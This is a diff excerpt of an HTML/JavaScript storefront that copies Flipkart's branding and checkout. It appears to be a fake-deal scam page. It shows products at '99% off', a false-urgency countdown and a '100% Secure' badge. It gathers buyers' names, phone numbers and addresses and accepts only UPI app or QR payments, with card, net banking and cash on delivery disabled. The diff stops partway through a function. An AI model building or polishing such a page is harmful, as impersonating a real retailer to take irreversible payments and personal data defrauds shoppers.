@@ -220,147 +220,273 @@
         </div>
     </div>
 
-    <div id="page-address" class="hidden fixed inset-0 bg-white z-[300] overflow-y-auto">
-        <nav class="fk-blue p-4 text-white flex items-center gap-4">
-            <i class="fa-solid fa-arrow-left" onclick="showPage('page-detail')"></i>
-            <span class="font-medium">Add Delivery Address</span>
-        </nav>
-      <div class="flex items-center justify-between bg-white px-8 py-3 border-b text-[10px] font-medium text-gray-500">
-    <div class="flex flex-col items-center gap-1 text-blue-600">
-        <div class="w-5 h-5 rounded-full border-2 border-blue-600 flex items-center justify-center bg-blue-600 text-white">1</div>
-        <span>Address</span>
-    </div>
-    <div class="h-[1px] bg-gray-300 flex-grow mx-2 -mt-4"></div>
-    <div class="flex flex-col items-center gap-1">
-        <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">2</div>
-        <span>Order Summary</span>
-    </div>
-    <div class="h-[1px] bg-gray-300 flex-grow mx-2 -mt-4"></div>
-    <div class="flex flex-col items-center gap-1">
-        <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">3</div>
-        <span>Payment</span>
-    </div>
-</div>
-        <div class="p-6 space-y-6">
-            <input type="text" id="uName" placeholder="Full Name (Required)*" class="line-input">
-            <input type="tel" id="uPhone" placeholder="Mobile Number (Required)*" class="line-input" maxlength="10">
-            <input type="number" id="uPin" placeholder="Pincode (Required)*" class="line-input" oninput="fetchPin(this.value)">
-            <div class="flex gap-4">
-                <input type="text" id="uCity" placeholder="City" class="line-input w-1/2 bg-gray-100" readonly>
-                <input type="text" id="uState" placeholder="State" class="line-input w-1/2 bg-gray-100" readonly>
-            </div>
-            <input id="uAdd" placeholder="House No, Building Name*" class="line-input">
-            <button onclick="goToSummary()" class="w-full btn-orange py-4 rounded shadow-lg uppercase">Save and Continue</button>
-        </div>
-    </div>
-<div id="page-summary" class="hidden fixed inset-0 bg-[#f1f3f6] z-[350] overflow-y-auto">
-    <nav class="fk-blue p-4 text-white flex items-center gap-4">
-        <i class="fa-solid fa-arrow-left" onclick="showPage('page-address')"></i>
-        <span class="font-medium">Order Summary</span>
+  <div id="page-address" class="hidden fixed inset-0 bg-white z-[300] overflow-y-auto pb-24">
+    <nav class="p-4 bg-white text-gray-800 flex items-center gap-4 sticky top-0 z-[310] border-b">
+        <i class="fa-solid fa-arrow-left text-xl" onclick="showPage('page-detail')"></i>
+        <span class="text-lg font-medium">Add delivery address</span>
     </nav>
 
-    <div class="bg-white px-4 py-4 flex items-center shadow-sm mb-2">
-        <div class="flex flex-col items-center flex-1">
-            <div class="w-5 h-5 bg-blue-600 text-white rounded-full flex items-center justify-center text-[10px]">✓</div>
-            <span class="text-[9px] mt-1 text-blue-600 font-bold uppercase">Address</span>
-        </div>
-        <div class="h-[1px] bg-blue-600 flex-1 mx-2"></div>
-        <div class="flex flex-col items-center flex-1">
-            <div class="w-5 h-5 bg-blue-600 text-white rounded-full flex items-center justify-center text-[10px]">2</div>
-            <span class="text-[9px] mt-1 text-blue-600 font-bold uppercase">Summary</span>
-        </div>
-        <div class="h-[1px] bg-gray-300 flex-1 mx-2"></div>
-        <div class="flex flex-col items-center flex-1 text-gray-400">
-            <div class="w-5 h-5 border border-gray-300 rounded-full flex items-center justify-center text-[10px]">3</div>
-            <span class="text-[9px] mt-1 font-bold uppercase">Payment</span>
-        </div>
-    </div>
-
-    <div class="bg-white p-4 mb-2 flex gap-4">
-        <img id="sum-img" src="" class="h-24 w-24 object-contain">
-        <div class="flex-1">
-            <p id="sum-name" class="text-sm font-medium line-clamp-2 text-gray-800"></p>
-            <p class="text-[11px] text-gray-400 mt-1">Seller: SuperComNet</p>
-            <div class="flex items-center gap-2 mt-2">
-                <span id="sum-price-bold" class="font-bold text-lg text-gray-900"></span>
-                <span id="sum-mrp-strike" class="text-gray-400 line-through text-xs"></span>
-                <span id="sum-discount-tag" class="text-green-600 text-xs font-bold"></span>
+    <div class="px-6 py-6 border-b mb-6">
+        <div class="flex items-center justify-between relative">
+            <div class="absolute top-3.5 left-0 w-full h-[1px] bg-gray-200 -z-10"></div>
+            
+            <div class="flex flex-col items-center gap-2 bg-white px-2">
+                <div class="w-7 h-7 rounded-full bg-blue-600 text-white flex items-center justify-center text-xs font-bold">1</div>
+                <span class="text-[11px] font-bold text-gray-800">Address</span>
+            </div>
+            <div class="flex flex-col items-center gap-2 bg-white px-2">
+                <div class="w-7 h-7 rounded-full border border-gray-300 text-gray-400 flex items-center justify-center text-xs">2</div>
+                <span class="text-[11px] text-gray-400">Order Summary</span>
+            </div>
+            <div class="flex flex-col items-center gap-2 bg-white px-2">
+                <div class="w-7 h-7 rounded-full border border-gray-300 text-gray-400 flex items-center justify-center text-xs">3</div>
+                <span class="text-[11px] text-gray-400">Payment</span>
             </div>
         </div>
     </div>
 
-    <div class="bg-white p-4 mb-20">
-        <p class="text-gray-500 font-bold text-xs uppercase border-b pb-3 mb-3 tracking-wider">Price Details</p>
-        <div class="space-y-4 text-sm">
-            <div class="flex justify-between text-gray-700"><span>Price (1 item)</span><span id="sum-mrp-val" class="text-gray-900"></span></div>
-            <div class="flex justify-between text-green-600"><span>Discount</span><span id="sum-disc-val"></span></div>
-            <div class="flex justify-between border-b border-dashed pb-4 text-green-600"><span>Delivery Charges</span><span>FREE</span></div>
-            <div class="flex justify-between font-bold text-lg text-gray-900 pt-1"><span>Total Amount</span><span id="sum-final-val"></span></div>
+    <div class="px-5 space-y-6">
+        
+        <div class="relative">
+            <input type="text" id="uName" placeholder=" " 
+                class="peer w-full p-4 border border-gray-300 rounded outline-none focus:border-blue-500 text-gray-700">
+            <label class="absolute left-3 top-4 text-gray-400 pointer-events-none transition-all duration-200 peer-focus:-top-2 peer-focus:left-2 peer-focus:text-xs peer-focus:bg-white peer-focus:px-1 peer-focus:text-blue-600 peer-[:not(:placeholder-shown)]:-top-2 peer-[:not(:placeholder-shown)]:left-2 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:bg-white peer-[:not(:placeholder-shown)]:px-1">Full Name</label>
         </div>
-        <div class="mt-4 p-3 bg-green-50 rounded border border-dashed border-green-200">
-            <p class="text-green-700 text-[13px] font-medium text-center">You will save <span id="sum-savings"></span> on this order</p>
+
+        <div class="relative">
+            <input type="tel" id="uPhone" placeholder=" " maxlength="10"
+                class="peer w-full p-4 border border-gray-300 rounded outline-none focus:border-blue-500 text-gray-700">
+            <label class="absolute left-3 top-4 text-gray-400 pointer-events-none transition-all duration-200 peer-focus:-top-2 peer-focus:left-2 peer-focus:text-xs peer-focus:bg-white peer-focus:px-1 peer-focus:text-blue-600 peer-[:not(:placeholder-shown)]:-top-2 peer-[:not(:placeholder-shown)]:left-2 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:bg-white peer-[:not(:placeholder-shown)]:px-1">Mobile number</label>
+        </div>
+
+        <div class="relative">
+            <input type="number" id="uPin" placeholder=" " oninput="fetchPin(this.value)"
+                class="peer w-full p-4 border border-gray-300 rounded outline-none focus:border-blue-500 text-gray-700">
+            <label class="absolute left-3 top-4 text-gray-400 pointer-events-none transition-all duration-200 peer-focus:-top-2 peer-focus:left-2 peer-focus:text-xs peer-focus:bg-white peer-focus:px-1 peer-focus:text-blue-600 peer-[:not(:placeholder-shown)]:-top-2 peer-[:not(:placeholder-shown)]:left-2 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:bg-white peer-[:not(:placeholder-shown)]:px-1">Pincode</label>
+        </div>
+
+        <div class="flex gap-3">
+            <div class="relative w-1/2">
+                <input type="text" id="uCity" placeholder=" " 
+                    class="peer w-full p-4 border border-gray-300 rounded outline-none focus:border-blue-500 text-gray-700">
+                <label class="absolute left-3 top-4 text-gray-400 pointer-events-none transition-all duration-200 peer-focus:-top-2 peer-focus:left-2 peer-focus:text-xs peer-focus:bg-white peer-focus:px-1 peer-focus:text-blue-600 peer-[:not(:placeholder-shown)]:-top-2 peer-[:not(:placeholder-shown)]:left-2 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:bg-white peer-[:not(:placeholder-shown)]:px-1">City</label>
+            </div>
+            
+            <div class="relative w-1/2">
+                <input type="text" id="uState" placeholder=" " 
+                    class="peer w-full p-4 border border-gray-300 rounded outline-none focus:border-blue-500 text-gray-700">
+                <label class="absolute left-3 top-4 text-gray-400 pointer-events-none transition-all duration-200 peer-focus:-top-2 peer-focus:left-2 peer-focus:text-xs peer-focus:bg-white peer-focus:px-1 peer-focus:text-blue-600 peer-[:not(:placeholder-shown)]:-top-2 peer-[:not(:placeholder-shown)]:left-2 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:bg-white peer-[:not(:placeholder-shown)]:px-1">State</label>
+            </div>
+        </div>
+
+        <div class="relative">
+            <input type="text" id="uAdd" placeholder=" " 
+                class="peer w-full p-4 border border-gray-300 rounded outline-none focus:border-blue-500 text-gray-700">
+            <label class="absolute left-3 top-4 text-gray-400 pointer-events-none transition-all duration-200 peer-focus:-top-2 peer-focus:left-2 peer-focus:text-xs peer-focus:bg-white peer-focus:px-1 peer-focus:text-blue-600 peer-[:not(:placeholder-shown)]:-top-2 peer-[:not(:placeholder-shown)]:left-2 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:bg-white peer-[:not(:placeholder-shown)]:px-1">House No., Building Name</label>
+        </div>
+
+        <div class="relative">
+            <input type="text" placeholder=" " 
+                class="peer w-full p-4 border border-gray-300 rounded outline-none focus:border-blue-500 text-gray-700">
+            <label class="absolute left-3 top-4 text-gray-400 pointer-events-none transition-all duration-200 peer-focus:-top-2 peer-focus:left-2 peer-focus:text-xs peer-focus:bg-white peer-focus:px-1 peer-focus:text-blue-600 peer-[:not(:placeholder-shown)]:-top-2 peer-[:not(:placeholder-shown)]:left-2 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:bg-white peer-[:not(:placeholder-shown)]:px-1">Road name, Area, Colony</label>
+        </div>
+
+    </div>
+
+    <div class="fixed bottom-0 left-0 w-full p-4 bg-white border-t z-[320]">
+        <button onclick="goToSummary()" class="w-full bg-[#fb641b] text-white py-4 rounded font-medium text-lg shadow-lg">
+            Proceed
+        </button>
+    </div>
+</div>
+<div id="page-summary" class="hidden fixed inset-0 bg-[#f1f3f6] z-[300] overflow-y-auto pb-24">
+    <nav class="p-4 bg-white text-gray-800 flex items-center gap-4 sticky top-0 z-[310] border-b">
+        <i class="fa-solid fa-arrow-left text-xl" onclick="showPage('page-address')"></i>
+        <span class="text-lg font-medium">Order Summary</span>
+    </nav>
+
+    <div id="sum-address-box" class="bg-white p-4 mb-2 hidden border-b">
+        <p class="text-[10px] text-gray-500 font-bold uppercase mb-1">Deliver to:</p>
+        <p id="sum-address-text" class="text-sm text-gray-800"></p>
+    </div>
+
+    <div class="bg-white p-4 mb-2 flex items-center justify-between">
+        <div>
+            <p class="font-bold text-gray-800 text-sm">Direct UPI Payment</p>
+            <p class="text-gray-500 text-xs mt-1">Support transformative social work in India</p>
+        </div>
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR07fJ06xU0fW-ZtP_vYn8O8O5l3z5uX6W9Vg&s" class="w-20 h-12 object-cover rounded">
+    </div>
+
+    <div class="bg-white p-4 flex gap-3 overflow-x-auto mb-2 border-b">
+        <div class="border rounded-full px-6 py-2 text-sm text-gray-700">₹10</div>
+        <div class="border rounded-full px-6 py-2 text-sm text-gray-700">₹20</div>
+        <div class="border rounded-full px-6 py-2 text-sm text-gray-700">₹50</div>
+        <div class="border rounded-full px-6 py-2 text-sm text-gray-700">₹100</div>
+    </div>
+
+    <div class="px-4 py-3 bg-white mb-2">
+        <p class="text-xs text-gray-400 font-medium italic">Note: GST and No cost EMI will not be applicable</p>
+    </div>
+
+    <div class="p-3">
+        <div class="bg-white rounded p-4 shadow-sm border border-gray-100">
+            <h3 class="text-gray-800 font-bold text-base border-b pb-3 mb-3">Price Details</h3>
+            
+            <div class="flex justify-between mb-3 text-sm">
+                <span class="text-gray-600">Price (1 items)</span>
+                <span id="sum-mrp-val" class="text-gray-800">₹0</span>
+            </div>
+            
+            <div class="flex justify-between mb-3 text-sm">
+                <span class="text-gray-600">Discount</span>
+                <span id="sum-disc-val" class="text-green-600 font-medium">-₹0</span>
+            </div>
+            
+            <div class="flex justify-between mb-4 text-sm border-b pb-4">
+                <span class="text-gray-600">Delivery Charges</span>
+                <span class="text-green-600 font-medium">Free</span>
+            </div>
+            
+            <div class="flex justify-between font-bold text-lg mb-4">
+                <span class="text-gray-800">Total Amount</span>
+                <span id="sum-final-val" class="text-gray-800">₹0</span>
+            </div>
+            
+            <div class="bg-green-50 text-green-700 p-2.5 rounded text-xs font-medium text-center border border-green-100">
+                You will save <span id="sum-savings">₹0</span> on this order
+            </div>
         </div>
     </div>
-    
-    <div class="fixed bottom-0 left-0 w-full p-3 bg-white border-t flex items-center justify-between px-6 shadow-[0_-5px_15px_rgba(0,0,0,0.08)]">
-        <div>
-            <p class="text-gray-400 line-through text-xs" id="sum-footer-mrp"></p>
-            <span id="sum-bottom-price" class="font-bold text-xl text-gray-900"></span>
+
+    <div class="px-6 py-4">
+        <p class="text-[10px] text-gray-500 leading-relaxed text-center">
+            By continuing with the order, you confirm that you are above 18 years of age, and you agree to the Flipkart's <span class="text-blue-600">Terms of Use</span> and <span class="text-blue-600">Privacy Policy</span>
+        </p>
+    </div>
+
+    <div class="fixed bottom-0 left-0 w-full bg-white border-t flex items-center justify-between px-6 py-3 z-[320]">
+        <div class="flex flex-col">
+            <span id="sum-footer-mrp" class="text-gray-400 line-through text-xs font-medium">₹0</span>
+            <span id="sum-bottom-price" class="text-lg font-bold text-gray-900 leading-none">₹0</span>
         </div>
-        <button onclick="showPage('page-payment')" class="btn-yellow px-10 py-3 rounded-sm font-bold text-sm">CONTINUE</button>
+        <button onclick="showPage('page-payment')" class="bg-[#ffc200] text-black font-bold py-3.5 px-10 rounded text-sm shadow-md">
+            Continue
+        </button>
     </div>
 </div>
 
 <div id="page-payment" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto pb-24">
-    <nav class="fk-blue p-4 text-white flex items-center gap-4 shadow-md">
-        <i class="fa-solid fa-arrow-left" onclick="showPage('page-summary')"></i>
-        <span class="font-medium text-lg">Payments</span>
+    <nav class="p-4 bg-white text-gray-800 flex flex-col sticky top-0 z-[310] border-b">
+        <div class="flex items-center gap-4">
+            <i class="fa-solid fa-arrow-left text-xl" onclick="showPage('page-summary')"></i>
+            <div class="flex flex-col">
+                <span class="text-[10px] text-gray-500 font-medium">Step 3 of 3</span>
+                <span class="text-lg font-bold leading-none">Payments</span>
+            </div>
+            <span class="ml-auto bg-gray-100 text-gray-600 text-[10px] px-2 py-1 rounded">100% Secure</span>
+        </div>
     </nav>
 
-    <div class="bg-white p-4 flex items-center gap-3 mb-2">
-        <i class="fa-solid fa-shield-check text-green-600 text-2xl"></i>
-        <div>
-            <p class="text-sm font-bold">Safe and Secure Payments</p>
-            <p class="text-[10px] text-gray-500 uppercase tracking-tighter">100% Payment Protection, Easy Returns</p>
+    <div class="bg-blue-50 m-3 rounded-lg border border-blue-100 p-4">
+        <div class="flex gap-4">
+            <img id="pay-rec-img" src="" class="w-16 h-16 object-contain bg-white rounded border p-1">
+            <div class="flex flex-col">
+                <p id="pay-rec-name" class="text-sm font-medium text-gray-800 line-clamp-1"></p>
+                <div class="flex items-center gap-2 mt-1">
+                    <span id="pay-total" class="text-blue-600 font-bold text-lg">₹0</span>
+                    <span id="pay-mrp" class="text-gray-400 line-through text-xs">₹0</span>
+                </div>
+                <p class="text-[11px] text-gray-600 mt-1">Delivery by: 27 Mar, Fri</p>
+            </div>
+        </div>
+        <div class="flex justify-between items-center mt-4 pt-3 border-t border-blue-200">
+            <span class="text-blue-700 font-bold">Total Amount</span>
+            <span id="pay-bottom-price" class="text-blue-700 font-bold text-lg">₹0</span>
         </div>
     </div>
 
-   <div class="bg-white">
-    <p class="p-4 text-[11px] font-bold text-gray-400 border-b tracking-wider uppercase">UPI Options</p>
-    
-    <input type="radio" name="payApp" id="gpay-radio" value="gpay" class="hidden">
-    <input type="radio" name="payApp" id="paytm-radio" value="paytm" class="hidden">
-    <input type="radio" name="payApp" id="qr-radio" value="qr" class="hidden">
-
-    <label id="label-gpay" class="flex items-center p-5 border-b gap-4 cursor-pointer pay-option" onclick="selectPay('gpay', this)">
-        <img src="https://img.icons8.com/color/48/google-pay.png" class="w-7 h-7">
-        <span class="text-sm font-bold text-gray-700">Google Pay</span>
-    </label>
-
-    <label id="label-paytm" class="flex items-center p-5 border-b gap-4 cursor-pointer pay-option" onclick="selectPay('paytm', this)">
-        <img src="https://img.icons8.com/color/48/paytm.png" class="w-7 h-7">
-        <span class="text-sm font-bold text-gray-700">Paytm</span>
-    </label>
-
-    <label id="label-qr" class="flex items-center p-5 border-b gap-4 cursor-pointer pay-option" onclick="selectPay('qr', this); toggleQR(this)">
-        <div class="w-7 h-7 flex items-center justify-center bg-orange-100 rounded text-orange-600">
-            <i class="fa-solid fa-qrcode"></i>
-        </div>
-        <span class="text-sm font-bold text-gray-700">UPI QR CODE</span>
-    </label>
-
-    <div id="qr-container" class="hidden mx-5 my-4 p-4 border-2 border-dashed border-blue-200 bg-blue-50 text-center rounded-lg">
-        <div id="qrcode-img" class="bg-white p-2 inline-block border shadow-sm"></div>
-        <p class="text-[10px] font-bold text-blue-600 mt-2">SCAN & PAY: <span id="qr-amount"></span></p>
-    </div>
-</div>
-
-    <div class="fixed bottom-0 w-full p-3 bg-white border-t flex items-center justify-between px-6 shadow-2xl">
+    <div class="bg-green-50 mx-3 mb-4 p-3 rounded-md border border-green-100 flex items-center justify-between">
         <div>
-            <p class="text-gray-400 line-through text-[10px]" id="pay-footer-mrp"></p>
-            <span id="pay-bottom-price" class="font-bold text-xl text-gray-900"></span>
+            <p class="text-green-700 font-bold text-sm">5% Cashback</p>
+            <p class="text-green-600 text-[10px]">Claim now with payment offers</p>
         </div>
-        <button onclick="confirmPay()" class="btn-orange px-10 py-3 shadow-xl font-bold text-sm rounded-sm uppercase">Place Order</button>
+        <div class="flex gap-1">
+            <img src="https://logowik.com/content/uploads/images/axis-bank3828.jpg" class="h-5 w-5 rounded-full object-cover">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR_nOnyzG7Zq9vjF-Mv9x_8hA0f6X9f6n6Z3A&s" class="h-5 w-5 rounded-full object-cover">
+        </div>
+    </div>
+
+    <div class="bg-white mb-2">
+        <div class="p-4 flex items-center gap-3">
+            <i class="fa-solid fa-money-bill-transfer text-gray-600"></i>
+            <div>
+                <p class="font-bold text-gray-800 text-sm tracking-wide">UPI</p>
+                <p class="text-gray-500 text-xs font-medium">Pay by any UPI app</p>
+            </div>
+        </div>
+
+        <label onclick="selectPay('phonepe', this)" class="pay-option flex items-center justify-between p-4 border-t cursor-pointer bg-blue-50 border-l-4 border-blue-500">
+            <div class="flex items-center gap-3">
+                <img src="https://i.ibb.co/XkKVMqt8/phonepe-icon.png" class="w-6 h-6 rounded">
+                <span class="text-sm font-bold text-gray-700">PhonePe</span>
+            </div>
+            <input type="radio" name="payApp" value="phonepe" checked class="w-5 h-5 accent-blue-600">
+        </label>
+
+        <label onclick="selectPay('paytm', this)" class="pay-option flex items-center justify-between p-4 border-t cursor-pointer">
+            <div class="flex items-center gap-3">
+                <img src="https://img.icons8.com/color/48/paytm.png" class="w-6 h-6 rounded">
+                <span class="text-sm font-bold text-gray-700">Paytm</span>
+            </div>
+            <input type="radio" name="payApp" value="paytm" class="w-5 h-5 accent-blue-600">
+        </label>
+
+        <label onclick="toggleQR(this); selectPay('qr', this)" class="pay-option flex items-center justify-between p-4 border-t cursor-pointer">
+            <div class="flex items-center gap-3">
+                <i class="fa-solid fa-qrcode text-xl text-gray-700"></i>
+                <span class="text-sm font-bold text-gray-700">QR Code</span>
+            </div>
+            <input type="radio" name="payApp" value="qr" class="w-5 h-5 accent-blue-600">
+        </label>
+    </div>
+
+    <div id="qr-container" class="hidden bg-white p-6 text-center border-t border-b mb-2">
+        <p class="text-sm font-bold text-gray-700 mb-2">Scan & Pay: <span id="qr-amount" class="text-blue-600"></span></p>
+        <div id="qrcode-img" class="mx-auto border p-2 w-max rounded shadow-sm"></div>
+    </div>
+
+    <div class="p-4 bg-white">
+        <button onclick="confirmPay()" id="main-pay-btn" class="w-full bg-[#ffc200] text-black font-extrabold py-4 rounded shadow-md text-base uppercase">
+            Pay ₹0
+        </button>
+    </div>
+
+    <div class="space-y-1 opacity-50 mt-2">
+        <div class="bg-white p-4 flex items-center justify-between border-t">
+            <div class="flex items-center gap-3">
+                <i class="fa-solid fa-credit-card text-gray-500"></i>
+                <div>
+                    <p class="font-bold text-gray-800 text-sm">Credit/Debit/ATM Card</p>
+                    <p class="text-[10px] text-gray-400">Add and secure cards</p>
+                </div>
+            </div>
+            <span class="text-[10px] text-gray-400">Unavailable</span>
+        </div>
+        <div class="bg-white p-4 flex items-center justify-between border-t">
+            <div class="flex items-center gap-3">
+                <i class="fa-solid fa-building-columns text-gray-500"></i>
+                <p class="font-bold text-gray-800 text-sm">Net Banking</p>
+            </div>
+            <span class="text-[10px] text-gray-400">Unavailable</span>
+        </div>
+        <div class="bg-white p-4 flex items-center justify-between border-t">
+            <div class="flex items-center gap-3">
+                <i class="fa-solid fa-hand-holding-dollar text-gray-500"></i>
+                <p class="font-bold text-gray-800 text-sm">Cash on Delivery</p>
+            </div>
+            <span class="text-[10px] text-gray-400">Unavailable</span>
+        </div>
     </div>
 </div>
 
@@ -466,300 +592,217 @@
             { id: 38, name: "OnePlus Nord Buds 2r Wireless Earbuds", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/y/i/-original-imagr4t8mwhmtyg9.jpeg"] },
             { id: 39, name: "OnePlus Nord Buds 2r Wireless Earbuds", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/y/i/-original-imagr4t8mwhmtyg9.jpeg"] }
         ];
+      
+    let sel = null;
+    let swpDet;
 
-        let sel = null;
-        let swpDet;
+    function init() {
+        const grid = document.getElementById('main-grid');
+        grid.innerHTML = ''; 
+        products.forEach(p => {
+            grid.innerHTML += `
+            <div class="bg-white p-2 border-[0.5px] border-gray-200 flex flex-col cursor-pointer" onclick="openProduct(${p.id})">
+                <div class="relative">
+                    <img src="${p.imgs[0]}" class="h-72 w-full object-contain mx-auto">
+                    <i class="fa-regular fa-heart absolute top-1 right-1 text-gray-400"></i>
+                </div>
+                <p class="text-xs mt-3 line-clamp-1 text-gray-700">${p.name}</p>
+                <div class="flex items-center gap-1 mt-1">
+                    <span class="bg-green-700 text-white text-[9px] px-1 rounded flex items-center gap-0.5">4.4 <i class="fa-solid fa-star text-[7px]"></i></span>
+                    <span class="text-gray-400 text-[9px] font-medium">(2,105)</span>
+                    <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_9e47c1.png" class="h-3 ml-auto">
+                </div>
+                <div class="flex items-center gap-1.5 mt-1">
+                    <span class="font-bold text-sm">₹${p.price}</span>
+                    <span class="text-gray-400 line-through text-[10px]">₹${p.mrp}</span>
+                    <span class="text-green-600 text-[10px] font-bold">99% off</span>
+                </div>
+                <p class="text-[10px] text-gray-800 mt-0.5">Free delivery</p>
+                <p class="text-[10px] text-green-700 font-bold">Daily Saver</p>
+            </div>`;
+        });
+        startTimer();
+    }
 
-        function init() {
-    const grid = document.getElementById('main-grid');
-    grid.innerHTML = ''; // Clear old content
-    products.forEach(p => {
-        grid.innerHTML += `
-        <div class="bg-white p-2 border-[0.5px] border-gray-200 flex flex-col cursor-pointer" onclick="openProduct(${p.id})">
-            <div class="relative">
-                <img src="${p.imgs[0]}" class="h-72 w-full object-contain mx-auto">
-                <i class="fa-regular fa-heart absolute top-1 right-1 text-gray-400"></i>
-            </div>
-            <p class="text-xs mt-3 line-clamp-1 text-gray-700">${p.name}</p>
-            <div class="flex items-center gap-1 mt-1">
-                <span class="bg-green-700 text-white text-[9px] px-1 rounded flex items-center gap-0.5">4.4 <i class="fa-solid fa-star text-[7px]"></i></span>
-                <span class="text-gray-400 text-[9px] font-medium">(2,105)</span>
-                <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_9e47c1.png" class="h-3 ml-auto">
-            </div>
-            <div class="flex items-center gap-1.5 mt-1">
-                <span class="font-bold text-sm">₹${p.price}</span>
-                <span class="text-gray-400 line-through text-[10px]">₹${p.mrp}</span>
-                <span class="text-green-600 text-[10px] font-bold">99% off</span>
-            </div>
-            <p class="text-[10px] text-gray-800 mt-0.5">Free delivery</p>
-            <p class="text-[10px] text-green-700 font-bold">Daily Saver</p>
-        </div>`;
-    });
-}
-      function startTimer() {
-    // Hum 8 ghante ka countdown set kar rahe hain
-    let hours = 00, minutes = 10, seconds = 0;
-
-    setInterval(() => {
-        if (seconds > 0) seconds--;
-        else {
-            seconds = 59;
-            if (minutes > 0) minutes--;
+    function startTimer() {
+        let hours = 0, minutes = 10, seconds = 0;
+        setInterval(() => {
+            if (seconds > 0) seconds--;
             else {
-                minutes = 59;
-                if (hours > 0) hours--;
+                seconds = 59;
+                if (minutes > 0) minutes--;
+                else {
+                    minutes = 59;
+                    if (hours > 0) hours--;
+                }
             }
+            document.getElementById('t-hours').innerText = hours.toString().padStart(2, '0');
+            document.getElementById('t-min').innerText = minutes.toString().padStart(2, '0');
+            document.getElementById('t-sec').innerText = seconds.toString().padStart(2, '0');
+        }, 1000);
+    }
+
+    function showPage(id) {
+        ['page-home', 'page-detail', 'page-address', 'page-summary', 'page-payment'].forEach(p => {
+            document.getElementById(p).classList.add('hidden');
+        });
+        document.getElementById(id).classList.remove('hidden');
+        window.scrollTo(0, 0);
+        
+        if (id === 'page-payment') {
+            updatePaymentDetails();
+        }
+    }
+
+    function openProduct(id) {
+        sel = products.find(p => p.id === id);
+        document.getElementById('det-name').innerText = sel.name;
+        document.getElementById('det-price').innerText = "₹" + sel.price;
+        document.getElementById('det-mrp').innerText = "₹" + sel.mrp;
+
+        const swpWrapper = document.getElementById('swiper-images');
+        swpWrapper.innerHTML = '';
+        sel.imgs.forEach(url => {
+            swpWrapper.innerHTML += `<div class="swiper-slide"><img src="${url}"></div>`;
+        });
+
+        const fS = document.getElementById('full-stack-images');
+        fS.innerHTML = ''; 
+        const dPhotos = (sel.descImgs && sel.descImgs.length > 0) ? sel.descImgs : sel.imgs;
+        dPhotos.forEach(url => {
+            fS.innerHTML += `<img src="${url}" class="w-full">`;
+        });
+
+        showPage('page-detail');
+        if (swpDet) swpDet.destroy();
+        swpDet = new Swiper(".detail-swiper", { pagination: { el: ".swiper-pagination" } });
+    }
+
+    async function fetchPin(pin) {
+        if (pin.length !== 6) return;
+        try {
+            const res = await fetch(`https://api.postalpincode.in/pincode/${pin}`);
+            const data = await res.json();
+            if (data[0].Status === "Success") {
+                document.getElementById('uCity').value = data[0].PostOffice[0].District;
+                document.getElementById('uState').value = data[0].PostOffice[0].State;
+            }
+        } catch (e) { console.log("PIN fetch error"); }
+    }
+
+    function goToSummary() {
+        const uName = document.getElementById('uName').value.trim();
+        const uPhone = document.getElementById('uPhone').value.trim();
+        const uPin = document.getElementById('uPin').value.trim();
+        const uCity = document.getElementById('uCity').value.trim();
+        const uState = document.getElementById('uState').value.trim();
+        const uAdd = document.getElementById('uAdd').value.trim();
+
+        if (!uName || !uPhone || !uPin || !uAdd) {
+            alert("Please fill all required fields!");
+            return;
         }
 
-        // DOM update karna
-        document.getElementById('t-hours').innerText = hours.toString().padStart(2, '0');
-        document.getElementById('t-min').innerText = minutes.toString().padStart(2, '0');
-        document.getElementById('t-sec').innerText = seconds.toString().padStart(2, '0');
-    }, 1000);
-}
-
-// init function ke andar ise call karein
-const originalInit = init;
-init = function() {
-    originalInit();
-    startTimer();
-};
-        function showPage(id) {
-            ['page-home', 'page-detail', 'page-address', 'page-summary', 'page-payment'].forEach(p => {
-                document.getElementById(p).classList.add('hidden');
-            });
-            document.getElementById(id).classList.remove('hidden');
-            window.scrollTo(0,0);
-        }
-
-        function openProduct(id) {
-            sel = products.find(p => p.id === id);
-            document.getElementById('det-name').innerText = sel.name;
-            document.getElementById('det-price').innerText = "₹" + sel.price;
-            document.getElementById('det-mrp').innerText = "₹" + sel.mrp;
-            
-            // Image Slider
-            const swpWrapper = document.getElementById('swiper-images');
-            swpWrapper.innerHTML = '';
-            sel.imgs.forEach(url => {
-                swpWrapper.innerHTML += `<div class="swiper-slide"><img src="${url}"></div>`;
-            });
-
-            // Product Description Stack (Using descImgs if available, else imgs)
-            const fS = document.getElementById('full-stack-images');
-            fS.innerHTML = ''; 
-            const dPhotos = (sel.descImgs && sel.descImgs.length > 0) ? sel.descImgs : sel.imgs;
-            dPhotos.forEach(url => {
-                fS.innerHTML += `<img src="${url}" class="w-full">`;
-            });
-
-            showPage('page-detail');
-            if(swpDet) swpDet.destroy();
-            swpDet = new Swiper(".detail-swiper", { pagination: { el: ".swiper-pagination" } });
-        }
-
-        function goToSummary() {
-    const uName = document.getElementById('uName').value;
-    const uPhone = document.getElementById('uPhone').value;
-
-    if(uName && uPhone) {
-        // Calculate dynamic discount
-        const mrpNum = parseInt(sel.mrp);
-        const priceNum = parseInt(sel.price);
+        const mrpNum = parseInt(sel.mrp.toString().replace(/[₹,]/g, '')) || 0;
+        const priceNum = parseInt(sel.price.toString().replace(/[₹,]/g, '')) || 0;
         const discountAmount = mrpNum - priceNum;
-        const discountPercent = Math.round((discountAmount / mrpNum) * 100);
 
